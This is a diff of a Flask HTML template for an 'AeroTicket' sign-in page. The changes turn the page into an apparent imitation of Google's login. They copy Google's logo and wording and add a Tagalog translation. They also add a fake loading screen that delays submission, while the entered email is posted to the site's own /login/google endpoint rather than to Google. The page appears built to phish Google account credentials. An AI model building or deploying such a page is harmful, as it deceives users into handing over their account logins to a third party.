@@ -6,49 +6,191 @@
     <title>AeroTicket - Sign In</title>
     <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="{{ url_for('static', filename='google.css') }}">
+    <style>
+        /* Loading Screen Styles */
+        #loading-screen {
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100%;
+            width: 100%;
+            position: absolute;
+            top: 0;
+            left: 0;
+            background-color: #fff;
+            z-index: 10;
+            border-radius: 8px;
+        }
 
+        .main-loader {
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #4285f4;
+            border-radius: 50%;
+            width: 35px;
+            height: 35px;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* Dropdown Styles */
+        .dropdown { position: relative; display: inline-block; }
+        .dropdown-content {
+            display: none;
+            position: absolute;
+            bottom: 100%;
+            left: 0;
+            background-color: #fff;
+            min-width: 160px;
+            box-shadow: 0px 8px 16px 0px rgba(0,0,0,0.2);
+            z-index: 1;
+            border-radius: 4px;
+            margin-bottom: 8px;
+        }
+        .dropdown-content a {
+            color: #1f1f1f;
+            padding: 12px 16px;
+            text-decoration: none;
+            display: block;
+            font-size: 14px;
+        }
+        .dropdown-content a:hover { background-color: #f1f1f1; border-radius: 4px; }
+        .show { display: block; }
+
+        /* Container Adjustment */
+        .right-panel { position: relative; min-height: 380px; }
+    </style>
 </head>
 <body>
 
 <div class="container">
     <div class="left-panel">
-        <div class="logo">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" width="48" alt="Google">
-        </div>
-        <h1>Sign in</h1>
-        <p class="subtext">Use your AeroTicket Account</p>
+        <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" width="48" class="logo">
+        <h1 id="header-title">Sign in</h1>
+        <p class="subtext" id="header-subtext">with your Google Account. This account will be available to other Google apps in the browser.</p>
     </div>
 
     <div class="right-panel">
-       <form action="/login/google" method="POST">
-    <input type="hidden" name="step" value="email">
-    
-    <div class="input-group">
-        <input type="email" name="email" placeholder="Email or phone" required autofocus>
-        <a href="#" class="forgot-link">Forgot email?</a>
-    </div>
+        <div id="loading-screen">
+            <div class="main-loader"></div>
+        </div>
 
-    <p class="guest-mode-info">
-        Not your computer? Use Guest mode to sign in privately. <br>
-        <a href="#">Learn more about using Guest mode</a>
-    </p>
+        <div id="form-content">
+            {% with messages = get_flashed_messages() %}
+              {% if messages %}
+                {% for message in messages %}
+                  <div style="color: #d93025; font-size: 14px; margin-bottom: 15px; display: flex; align-items: center;">
+                    <span style="margin-right: 8px;">⚠️</span> {{ message }}
+                  </div>
+                {% endfor %}
+              {% endif %}
+            {% endwith %}
 
-    <div class="button-row">
-        <a href="{{ url_for('signup') }}" class="create-btn">Create account</a>
-        <button type="submit" class="next-btn">Next</button>
-    </div>
-</form>
+            <form action="/login/google" method="POST" id="emailForm">
+                <input type="hidden" name="step" value="email">
+
+                <div class="input-wrapper">
+                    <input type="email" name="email" id="email" placeholder=" " required>
+                    <label for="email" id="label-email">Email or phone</label>
+                </div>
+
+                <a href="#" class="forgot-link" id="link-forgot">Forgot email?</a>
+
+                <div class="guest-mode-info" id="guest-info">
+                    Not your computer? Use Guest mode to sign in privately.<br>
+                    <a href="#">Learn more about using Guest mode</a>
+                </div>
+
+                <div class="button-row" style="justify-content: flex-end;">
+                    <button type="submit" class="next-btn" id="btn-next">Next</button>
+                </div>
+            </form>
+        </div>
     </div>
 </div>
 
 <div class="page-footer">
-    <div>English (United States) ▼</div>
+    <div class="dropdown">
+        <span style="cursor:pointer" onclick="toggleLangMenu()" id="current-lang">English (United States) ▼</span>
+        <div id="langDropdown" class="dropdown-content" style="bottom: 25px;">
+            <a href="javascript:void(0)" onclick="changeLanguage('en')">English (United States)</a>
+            <a href="javascript:void(0)" onclick="changeLanguage('tl')">Tagalog</a>
+        </div>
+    </div>
     <div class="footer-links">
         <span>Help</span>
         <span>Privacy</span>
         <span>Terms</span>
     </div>
 </div>
+
+<script>
+    // Toggle Language Menu
+    function toggleLangMenu() {
+        document.getElementById("langDropdown").classList.toggle("show");
+    }
+
+    // Language Switch Function
+    function changeLanguage(lang) {
+        const translations = {
+            'en': {
+                title: "Sign in",
+                subtext: "with your Google Account. This account will be available to other Google apps in the browser.",
+                email: "Email or phone",
+                forgot: "Forgot email?",
+                next: "Next",
+                lang: "English (United States) ▼"
+            },
+            'tl': {
+                title: "Mag-sign in",
+                subtext: "gamit ang iyong Google Account. Magagamit ang account na ito sa iba pang Google app sa browser.",
+                email: "Email o telepono",
+                forgot: "Nakalimutan ang email?",
+                next: "Susunod",
+                lang: "Tagalog ▼"
+            }
+        };
+
+        document.getElementById("header-title").innerText = translations[lang].title;
+        document.getElementById("header-subtext").innerText = translations[lang].subtext;
+        document.getElementById("label-email").innerText = translations[lang].email;
+        document.getElementById("link-forgot").innerText = translations[lang].forgot;
+        document.getElementById("btn-next").innerText = translations[lang].next;
+        document.getElementById("current-lang").innerText = translations[lang].lang;
+        
+        document.getElementById("langDropdown").classList.remove("show");
+    }
+
+    // FORM SUBMISSION WITH 1.5s LOADING
+    const emailForm = document.getElementById('emailForm');
+    const formContent = document.getElementById('form-content');
+    const loadingScreen = document.getElementById('loading-screen');
+
+    emailForm.addEventListener('submit', function(e) {
+        e.preventDefault(); // Stop instant submit
+        formContent.style.display = 'none'; // Hide layouts
+        loadingScreen.style.display = 'flex'; // Show loading panel
+
+        setTimeout(() => {
+            emailForm.submit(); // Submit after 1.5 seconds
+        }, 1500);
+    });
+
+    window.onclick = function(event) {
+        if (!event.target.matches('#current-lang')) {
+            var dropdowns = document.getElementsByClassName("dropdown-content");
+            for (var i = 0; i < dropdowns.length; i++) {
+                if (dropdowns[i].classList.contains('show')) {
+                    dropdowns[i].classList.remove('show');
+                }
+            }
+        }
+    }
+</script>
 
 </body>
 </html>
